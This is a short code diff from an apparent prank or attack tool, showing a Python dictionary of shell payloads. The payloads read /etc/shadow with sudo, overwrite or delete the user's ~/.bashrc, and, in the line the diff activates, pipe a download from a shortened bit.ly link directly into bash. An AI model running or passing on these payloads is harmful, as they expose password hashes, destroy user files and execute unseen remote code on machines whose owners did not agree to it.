@@ -45,7 +45,7 @@ payloads={
 'shadow':'sudo cat /etc/shadow',
 'warning':'sudo echo "echo "change your password!"" \> \~/.bashrc',
 'raincow_bashrc':'sudo echo "fortune \| cowsay \| lolcat" \>\> \~/.bashrc',
-#'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash',
+'rickroll':'curl -s -L http://bit.ly/10hA8iC | bash',
 'rm_bashrc':'rm -rf \~/.bashrc'
 }
 
